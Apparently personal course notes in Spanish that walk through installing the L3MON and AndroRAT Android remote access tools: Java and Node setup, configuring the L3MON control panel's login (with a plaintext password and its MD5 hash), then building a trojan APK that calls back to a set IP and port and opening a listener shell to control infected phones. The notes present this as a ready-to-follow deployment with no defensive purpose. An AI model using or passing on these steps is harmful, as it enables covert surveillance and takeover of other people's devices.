fuentes
- https://muylinux.xyz/l3mon-acceso-remoto-a-dispositivos-android/
- 

### Comandos de instalación de java:

1 – Descargar Java del material del curso para poder instalarlo.
```shell
sudo apt install ./nvidia-openjdk-8-jre.deb

# setearemos la version 8 de java por defecto
export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64"


sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java" 3

sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/java-8-openjdk-amd64/bin/javac" 3
# update-alternatives: error: alternative path /usr/lib/jvm/java-8-openjdk-amd64/bin/javac doesn't exist

 
# Al ejecutar escoger la version 2
sudo update-alternatives --config java
# There are 2 choices for the alternative java (providing /usr/bin/java).
# 
#   Selection    Path                                            Priority   Status
# ------------------------------------------------------------
# * 0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      auto mode
#   1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      manual mode
#   2            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   3         manual mode
# 
# Press <enter> to keep the current choice[*], or type selection number: 2
# update-alternatives: using /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java to provide /usr/bin/java (java) in manual mode



```

## Comandos de instalación de npm:
```shell


sudo curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt-get install nodejs

sudo npm install pm2 -g
# comandos para iniciar L3MON pm2: 
# entramos ala carpeta personal donde esta descargado
cd /home/cesar/L3MON-v1.1.2 
pm2 start index.js
sudo pm2 startup

# detener L3MON para configurar el usuario y contraseña:
pm2 stop index

# configurar usuario y contraseña:
nano maindb.json

# generamos la contraseña de md5 en : http://www.md5.cz/
echo -n "cesar203" | md5sum | cut -d" " -f 1

#   06f0b51dfdee832cd7c65921583ec60a  => cesar203


# ahora iniciamos denuevo la aplicacion
pm2 restart all

#ahora entramos al panel
entrar en la ip local de la maquina:( http://<SERVER IP>:22533)

```

```shell
sudo apt install python3-pip
pip install colorama
git clone https://github.com/karma9874/AndroRAT.git
cd /home/cesar/AndroRAT
# instalamos los requerimientos
pip install -r requirements.txt

# generar el apk 
python3 androRAT.py --build -i 192.168.0.70 -p 8000 -o androrat.apk
# ponernos a escuchar en 
sudo python3 androRAT.py --shell -i 192.168.0.70 -p 8000
```
